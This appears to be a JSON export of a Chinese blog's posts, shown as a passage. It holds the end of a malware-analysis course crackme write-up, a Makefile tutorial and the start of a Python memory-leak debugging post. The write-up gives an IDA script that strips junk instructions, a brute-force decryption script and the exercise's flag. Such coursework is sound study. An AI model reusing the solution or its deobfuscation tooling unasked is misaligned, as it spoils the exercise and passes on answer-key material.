class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tpatch_byte(ea, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\">\tAnalyseRange(startea,endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">recognize</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"push    ebp\"</span> <span class=\"keyword\">and</span> GetDisasm(curea+<span class=\"number\">1</span>) == <span class=\"string\">\"mov     ebp, esp\"</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">\"should be make\"</span></span><br><span class=\"line\">\t\t\tauto_make_proc(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\tpreprocess()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tremove()</span><br><span class=\"line\">\trecognize()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-加密算法分析与逆向\"><a href=\"#0x03-加密算法分析与逆向\" class=\"headerlink\" title=\"0x03  加密算法分析与逆向\"></a>0x03  加密算法分析与逆向</h2><p>至此，我们已经解决了花指令问题，可以开始分析具体算法了。main函数中会调用encrypt函数加密，最后调用hexencode函数输出结果。</p>\n<p>直接查看encrypt函数的F5代码，但是由于是C++程序，伪C代码比较乱，看不出所以然。不过我们可以明确encrypt函数中首先调用了enc2函数。其核心代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ABF                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AC4                 cmp     [ebp-30h], eax  ; cnt &lt; 源字符串长度时</span><br><span class=\"line\">.text:00401AC7                 jnb     short loc_401B18</span><br><span class=\"line\">.text:00401AC9                 push    eax             ; 先push eax</span><br><span class=\"line\">.text:00401ACA                 xor     eax, eax        ; 花指令</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3      ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD2                 nop</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax             ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AD7                 push    eax</span><br><span class=\"line\">.text:00401AD8                 lea     ecx, [ebp+0Ch]</span><br><span class=\"line\">.text:00401ADB                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取源字符串中下标cnt处字符</span><br><span class=\"line\">.text:00401AE0                 movsx   ebx, byte ptr [eax] ; 放到ebx中</span><br><span class=\"line\">.text:00401AE3                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AE6                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AEB                 mov     ecx, eax        ; 取字符串&quot;2&quot;的长度放到ecx中</span><br><span class=\"line\">.text:00401AED                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AF0                 xor     edx, edx        ; 高位置0</span><br><span class=\"line\">.text:00401AF2                 div     ecx             ; cnt / &quot;2&quot;的长度</span><br><span class=\"line\">.text:00401AF4                 push    edx             ; 余数压栈</span><br><span class=\"line\">.text:00401AF5                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AF8                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401AFD                 movsx   edx, byte ptr [eax] ; 放在edx中</span><br><span class=\"line\">.text:00401B00                 xor     ebx, edx        ; ord[cnt] ^ key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401B02                 movsx   eax, byte ptr [ebp+1Ch]</span><br><span class=\"line\">.text:00401B06                 xor     ebx, eax\t\t   ; 再次与输入的密钥字符异或</span><br><span class=\"line\">.text:00401B08                 mov     ecx, [ebp-30h]</span><br><span class=\"line\">.text:00401B0B                 push    ecx</span><br><span class=\"line\">.text:00401B0C                 lea     ecx, [ebp-2Ch]</span><br><span class=\"line\">.text:00401B0F                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](uint)</span><br><span class=\"line\">.text:00401B14                 mov     [eax], bl</span><br></pre></td></tr></table></figure>\n<p>这里0x401aeb处的操作比较有趣，这个字符串为什么是2呢？猜想到可能与函数名enc2的2有关，于是用OD调试enc3、enc5函数，发现这个串变成”3”和”5”，这说明果然与函数名有关。</p>\n<p>调用enc2并在两次按位异或后，将结果存储并回到encrpyt函数体调用enc3，然后通过异常处理链调用enc5、enc8……，最后调用enc28657，最后得到加密结果。因此，加密算法的逻辑已经很清楚了，给出Python实现</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tres = <span class=\"string\">\"thisisasimplesamplestring\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>]:</span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(res):</span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ ord(num[i % len(num)]) &amp; <span class=\"number\">0xff</span>) ^ key) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tres = tmp</span><br><span class=\"line\">\tflag = res</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br></pre></td></tr></table></figure>\n<p>为了求解flag，需要求解这个算法的逆算法。因为都是按位异或，很容易得到逆算法，并爆破所有可见字符即可catch flag。</p>\n<p>最终脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tencrypted = <span class=\"string\">\"\\x3A\\x3B\\x31\\x38\\x23\\x3B\\x3C\\x34\\x37\\x30\\x0B\\x37\\x30\\x07\\x32\\x28\\x39\\x35\\x23\\x06\\x2E\\x2B\\x24\\x2A\"</span>[::<span class=\"number\">-1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>][::<span class=\"number\">-1</span>]:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print n</span></span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(encrypted):</span><br><span class=\"line\">\t\t\ti = len(encrypted) - i - <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print i</span></span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ key &amp; <span class=\"number\">0xff</span>) ^ ord(num[(i % len(num))])) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tencrypted = tmp</span><br><span class=\"line\">\tflag = encrypted</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>, <span class=\"number\">126</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> chr(i)</span><br><span class=\"line\">\t\tres = decrypt(i)</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> res[::<span class=\"number\">-1</span>]</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a</span><br><span class=\"line\">flag&#123;ocean_of_junks_zzz&#125;</span><br></pre></td></tr></table></figure>\n","text":"​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。0x00  基本分析首先动态执行程序看一下1<br>2<br>3<br>4<br>5<br>6<br>D:\\UCAS\\malware_analyse&gt;Ant","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"一个简单的Makefile教程","slug":"一个简单的Makefile教程","date":"2018-11-19T14:31:41.000Z","updated":"2018-11-19T15:38:42.000Z","comments":true,"path":"api/articles/一个简单的Makefile教程.json","excerpt":"","keywords":null,"cover":null,"content":"<p>Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。</p>\n<h2 id=\"0x00-一个简单的例子\"><a href=\"#0x00-一个简单的例子\" class=\"headerlink\" title=\"0x00  一个简单的例子\"></a>0x00  一个简单的例子</h2><p>让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。</p>\n<p><code>hellomake.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// call a function in another file</span></span><br><span class=\"line\">    myPrintHelloMake();</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellofunc.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello makefiles!\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellomake.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">example include file</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>一般地，可以通过下面的指令编译这些代码</p>\n<p><code>gcc -o hellomake hellomake.c hellofunc.c -I.</code></p>\n<p>这将编译两个.c文件 hellomake.c、hellofunc.c，并且指定可执行文件的名字为hellomake。-I dir是指定搜索头文件的目录的路径为dir，而-I.是指定在当前目录下寻找。没有makefile的话，为了重复测试/修改/调试你的代码，常见的做法是用上方向键在终端中找到上一条指令，因而你就不用每次重新输入指令。</p>\n<p>不幸的是，这种做法有两个弊端。第一，如果你弄丢了编译指令或者换了一台计算机，你将不得不重新输入，导致效率极低。第二，如果你只修改了一个.c文件，每次都重新编译所有的文件也是耗时且低效的。因此，我们需要学习如何使用makefile。</p>\n<h2 id=\"0x01-Makefile1\"><a href=\"#0x01-Makefile1\" class=\"headerlink\" title=\"0x01  Makefile1\"></a>0x01  Makefile1</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hellomake: hellomake.c hellofunc.c</span><br><span class=\"line\">\tgcc -o hellomake hellomake.c hellofunc.c -I.</span><br></pre></td></tr></table></figure>\n<p>将上述规则（rule）写到文件Makefile或makefile中，放在同一路径下，然后键入make就可以执行相应的编译。另外，通过将指令所需要的文件列在第一行的冒号之后，make会知道规则hellomake在这些文件之一被修改时需要被执行。此时，你已经解决了问题1——不需要再使用上方向键了。</p>\n<p><em>gcc指令之前需要有一个tab，而且在任何指令之前必须有一个tab。(必须是tab不能是空格)</em></p>\n<h2 id=\"0x02-Makefile2\"><a href=\"#0x02-Makefile2\" class=\"headerlink\" title=\"0x02  Makefile2\"></a>0x02  Makefile2</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\"></span><br><span class=\"line\">hellomake: hellomake.o hellofunc.o</span><br><span class=\"line\">\t$(CC) -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>现在你已经定义了一些常量CC和CFLAGS。这些特殊的常量将告诉make指令我们将如何编译文件hellomake.c和hellofunc.c。特别地，CC表明所使用的C编译器，CFLAGS表明传递给编译器的参数。通过将目标文件——hellomake.o和hellofunc.o放在依赖列表和规则中，make知道它必须首先独立的编译.c为.o，然后将他们编译成一个可执行文件hellomake。</p>\n<p>使用这个形式的makefile对大多数小规模的项目十分有效。然而，头文件的依赖被遗忘了。举例来说，如果我们修改了hellomake.h，make将不会重新编译.c文件，即使它需要这么做。为了解决这个问题，我们需要指明.c文件所依赖的.h文件。通过再编写一个简单的规则并且添加进makefile中可以达成目的。</p>\n<h2 id=\"0x03-Makefile3\"><a href=\"#0x03-Makefile3\" class=\"headerlink\" title=\"0x03  Makefile3\"></a>0x03  Makefile3</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\">DEPS=hellomake.h</span><br><span class=\"line\"></span><br><span class=\"line\">%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\"></span><br><span class=\"line\">hellomake: hellomake.o hellofunc.o</span><br><span class=\"line\">\t$(CC) -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>这个例子首先定义了一个叫DEPS的变量，表示.c文件所依赖的头文件的集合。然后定义了一个规则应用于所有.o后缀的文件。这个规则指定每个.o文件依赖于相应的.c文件和DEPS所表示的.h文件。-c参数指定产生.o文件，-o $@说明将编译结果输出在<strong>冒号左边</strong>的名字的文件中，$&lt;是<strong>依赖列表中的第一个文件</strong>（即.c文件），最后加上其它编译参数。</p>\n<p>make执行的命令序列如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c -o hellomake.o hellomake.c -I.</span><br><span class=\"line\">gcc -c -o hellofunc.o hellofunc.c -I.</span><br><span class=\"line\">gcc -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>为了最终简化，我们使用特殊的宏$@和$^使得编译规则更加普适化。</p>\n<p>$@表示冒号的左端、$^表示冒号的右端，$&lt;表示依赖列表中第一个文件</p>\n<h2 id=\"0x04-Makefile4\"><a href=\"#0x04-Makefile4\" class=\"headerlink\" title=\"0x04  Makefile4\"></a>0x04  Makefile4</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\">DEPS=hellomake.h</span><br><span class=\"line\">OBJ=hellomake.o hellofunc.o</span><br><span class=\"line\"></span><br><span class=\"line\">%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\">\t</span><br><span class=\"line\">hellomake: $(OBJ)</span><br><span class=\"line\">\t$(CC) -o <span class=\"variable\">$@</span> $^ $(CFLAGS)</span><br></pre></td></tr></table></figure>\n<p>那如果我们想将.h文件放到include目录中，将源文件放到src目录中，将一些库放在lib目录中呢？此外，我们可以采用某种方法隐藏（其实只是一种障眼法hhh）那些无处不在的讨厌的.o文件吗？答案当然是可以的。下面这个makefile定义了src和lib目录的路径，并且将目标文件集中放在src目录下的obj子目录中。它也定义了表示所要包含的库的变量，例如数学库-lm。这个makefile需要放在src目录下。最后，定义了make clean的规则。</p>\n<h2 id=\"0x05-Makefile5\"><a href=\"#0x05-Makefile5\" class=\"headerlink\" title=\"0x05 Makefile5\"></a>0x05 Makefile5</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IDIR=../include</span><br><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I$(IDIR)</span><br><span class=\"line\"></span><br><span class=\"line\">ODIR=obj</span><br><span class=\"line\">LDIR=../lib</span><br><span class=\"line\"></span><br><span class=\"line\">LIBS=-lm</span><br><span class=\"line\"></span><br><span class=\"line\">_DEP=hellomake.h</span><br><span class=\"line\">DEPS=$(patsubst %,$(IDIR)/%,$(_DEP))</span><br><span class=\"line\"></span><br><span class=\"line\">_OBJ=hellomake.o hellofunc.o</span><br><span class=\"line\">OBJ=$(patsubst %,$(ODIR)/%,$(_OBJ))</span><br><span class=\"line\"></span><br><span class=\"line\">$(ODIR)/%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\">hellomake: $(OBJ)</span><br><span class=\"line\">\t$(CC) -o <span class=\"variable\">$@</span> $^ $(CFLAGS) $(LIBS)</span><br><span class=\"line\">\t</span><br><span class=\"line\">.PHONY: clean</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">\trm -f $(ODIR)/*.o hellomake</span><br></pre></td></tr></table></figure>\n<p>.PHONY规则是为了避免二义性。</p>\n<p>另外，patsubstd的定义如下： <code>$(patsubst pattern,replacement,text)</code></p>\n<p>从text中寻找按空格划分的单词中符合pattern的，然后用replacement替换掉它。pattern可能包含一个’%’作为通配符，匹配单词中任何数量的字符。如果replacement中也包含’%’，则这个’%’会被pattern的’%’所匹配的内容所替换。</p>\n<p>##0x06  总结</p>\n<p>总之，编写一个makefile重点就是定义一些变量和一些规则，规则格式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targets : prerequisites</span><br><span class=\"line\">\trecipe</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targets : prerequisites ; recipe</span><br><span class=\"line\">\trecipe</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n<p>大体上，先明确头文件，再写.o的生成规则，最后写二进制文件的生成规则即可。</p>\n<p>当然，还包括一些导向(directive)指令，主要包括：</p>\n<ul>\n<li>包含其它makefile文件</li>\n<li>控制语句</li>\n<li>定义多行变量</li>\n</ul>\n<p>理解了这些，对于中小规模的项目来说，编写一个makefile文件是非常容易的。当然，如果使用CMAKE，可能会更加便利，但是也需要额外的学习成本。</p>\n<blockquote>\n<p><a href=\"http://www.cs.colby.edu/maxwell/courses/tutorials/maketutor/\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n</blockquote>\n","text":"Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。0x00  一个简单的例子让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。hellomake.c","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":2,"path":"api/tags/Dev.json"}]},{"title":"调试并解决Python内存泄露问题","slug":"调试并解决Python内存泄露问题","date":"2018-11-05T13:46:33.000Z","updated":"2018-11-06T06:00:12.000Z","comments":true,"path":"api/articles/调试并解决Python内存泄露问题.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/zkbTrwr.png","content":"<p>0x00  问题引入<br>虽然Python本身有垃圾回收机制，但是也有内存泄露的可能。这里我对这次调试项目代码的经验作简单总结，予以参考。</p>\n<p>一般来说，可能出现内存泄露的情况，有如下几种：<br>1.对象被全局变量所引用，而生命周期较长<br>2.gc被禁用，使用<code>gc.disabled()</code>和<code>gc.enable()</code>进行操作<br>3.变量的循环引用。一般来说，只要开启gc，即使存在变量的循环引用，也不会导致内存泄露。但如果对象属于不可回收的，就无法处理。不可回收的变量通过<code>gc.garbage</code>查看，实际上就是实现了<code>__del__()</code>方法的对象</p>\n<p>python的官方文档中对garbage方法的说明如下：</p>\n<blockquote>\n<p>A list of objects which the collector found to be unreachable but could not be freed (uncollectable objects). By default, this list contains only objects with <code>__del__()</code> methods. [1] Objects that have <code>__del__()</code> methods and are part of a reference cycle cause the entire reference cycle to be uncollectable, including objects not necessarily in the cycle but reachable only from it. Python doesn’t collect such cycles automatically because, in general, it isn’t possible for Python to guess a safe order in which to run the <code>__del__()</code> methods. </p>\n</blockquote>\n<p>简单解释一下，垃圾回收器会将不可达但不能被释放的对象标识为garbage。默认garbage列表只包含实现了<code>__del__()</code>方法的对象，这些对象属于一个循环引用的话会导致整个循环引用变得不可被回收。Python不会自动地回收这些循环，因为基本上Python不可能猜到真正安全的执行<code>__del__()</code>方法的顺序。当然如果你自己知道如何处理，可以用类似<code>del gc.garbage[:]</code>的方法在循环结束后手动释放。</p>\n<hr>\n<p>0x01  辅助工具</p>\n<p>首先推荐安装第三方工具Pyrasite，它可以在Python进程动态运行时修改数据和代码等，这显然有利于我们调试内存泄漏问题。它的最新版安装需要gdb(7.3版本以上)和Python2.4以上的环境。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(sudo) pip install pyrasite pyrasite-gui</span><br></pre></td></tr></table></figure></p>\n<p>如果操作系统是Ubuntu10.10以上，需要首先执行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 0 &gt; 